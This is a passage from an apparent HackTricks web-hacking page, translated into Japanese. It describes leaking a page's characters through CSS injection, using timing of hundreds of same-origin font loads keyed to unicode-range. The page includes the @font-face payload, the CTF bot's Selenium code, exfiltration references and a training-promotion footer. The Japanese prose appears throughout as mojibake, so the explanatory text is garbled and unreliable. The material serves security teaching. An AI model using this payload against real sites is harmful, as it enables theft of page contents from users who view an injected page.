### ãƒ†ã‚­ã‚¹ãƒˆãƒãƒ¼ãƒ‰ã®æµå‡º (III): æ•°ç™¾ã®ãƒ­ãƒ¼ã‚«ãƒ«ã€Œãƒ•ã‚©ãƒ³ãƒˆã€ã‚’ã‚¿ã‚¤ãƒŸãƒ³ã‚°ã§èª­ã¿è¾¼ã‚€ã“ã¨ã«ã‚ˆã‚‹æ–‡å­—ã‚»ãƒƒãƒˆã®æ¼æ´© (å¤–éƒ¨ã‚¢ã‚»ãƒƒãƒˆã‚’å¿…è¦ã¨ã—ãªã„) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**å‚è€ƒ:** ã“ã‚Œã¯ [ã“ã®æ›¸ãè¾¼ã¿ã®ä¸­ã§ã®å¤±æ•—ã—ãŸè§£æ±ºç­–ã¨ã—ã¦è¨€åŠã•ã‚Œã¦ã„ã¾ã™](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

ã“ã®å ´åˆã€ä¸€è‡´ãŒç™ºç”Ÿã—ãŸã¨ãã«**åŒã˜ã‚ªãƒªã‚¸ãƒ³ã‹ã‚‰æ•°ç™¾ã®å½ãƒ•ã‚©ãƒ³ãƒˆã‚’èª­ã¿è¾¼ã‚€ã‚ˆã†ã«CSSã‚’æŒ‡ç¤ºã§ãã¾ã™**ã€‚ã“ã®æ–¹æ³•ã§ã€**ã‹ã‹ã‚‹æ™‚é–“ã‚’æ¸¬å®š**ã—ã€æ–‡å­—ãŒç¾ã‚Œã‚‹ã‹ã©ã†ã‹ã‚’æ¬¡ã®ã‚ˆã†ãªã‚‚ã®ã§ç¢ºèªã§ãã¾ã™ï¼š
```css
@font-face {
font-family: "A1";
src: url(/static/bootstrap.min.css?q=1),
url(/static/bootstrap.min.css?q=2),
....
url(/static/bootstrap.min.css?q=500);
unicode-range: U+0041;
}
```
ãã—ã¦ãƒœãƒƒãƒˆã®ã‚³ãƒ¼ãƒ‰ã¯æ¬¡ã®ã‚ˆã†ã«ãªã‚Šã¾ã™ï¼š
```python
browser.get(url)
WebDriverWait(browser, 30).until(lambda r: r.execute_script('return document.readyState') == 'complete')
time.sleep(30)
```
ãã†ã§ã‚ã‚Œã°ã€ãƒ•ã‚©ãƒ³ãƒˆãŒä¸€è‡´ã—ãªã„å ´åˆã€ãƒœãƒƒãƒˆã‚’è¨ªå•ã—ãŸéš›ã®å¿œç­”æ™‚é–“ã¯ç´„30ç§’ã«ãªã‚‹ã¨äºˆæƒ³ã•ã‚Œã¾ã™ã€‚ã—ã‹ã—ã€ãƒ•ã‚©ãƒ³ãƒˆãŒä¸€è‡´ã™ã‚‹å ´åˆã€ãƒ•ã‚©ãƒ³ãƒˆã‚’å–å¾—ã™ã‚‹ãŸã‚ã«è¤‡æ•°ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆãŒé€ä¿¡ã•ã‚Œã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã¯ç¶™ç¶šçš„ã«æ´»å‹•ã—ã¾ã™ã€‚ãã®çµæœã€åœæ­¢æ¡ä»¶ã‚’æº€ãŸã—ã¦å¿œç­”ã‚’å—ã‘å–ã‚‹ã¾ã§ã«æ™‚é–“ãŒã‹ã‹ã‚Šã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€å¿œç­”æ™‚é–“ã¯ãƒ•ã‚©ãƒ³ãƒˆã®ä¸€è‡´ã‚’åˆ¤æ–­ã™ã‚‹æŒ‡æ¨™ã¨ã—ã¦ä½¿ç”¨ã§ãã¾ã™ã€‚

## References

* [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)
* [https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b](https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b)
* [https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d](https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d)
* [https://x-c3ll.github.io/posts/CSS-Injection-Primitives/](https://x-c3ll.github.io/posts/CSS-Injection-Primitives/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
